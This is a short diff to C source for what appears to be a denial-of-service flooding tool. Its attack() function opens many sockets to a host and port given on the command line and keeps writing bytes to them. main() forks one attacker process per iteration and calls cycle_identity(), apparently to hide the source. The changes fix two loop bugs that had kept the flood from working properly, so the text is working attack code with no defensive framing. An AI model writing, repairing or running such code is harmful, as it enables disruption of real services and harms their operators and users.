@@ -60,7 +60,7 @@ void attack(char *host, char *port, int id) {
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
-		for(i=50000; i < 65535; i++) {
+		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 		        r=write(sockets[x], "\0", 1);
@@ -91,7 +91,7 @@ int main(int argc, char **argv) {
 	int x;
 	if(argc !=3)
 		cycle_identity();
-	for(x=0; x >= PPS; x++) {
+	for(x=0; x < PPS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
 		
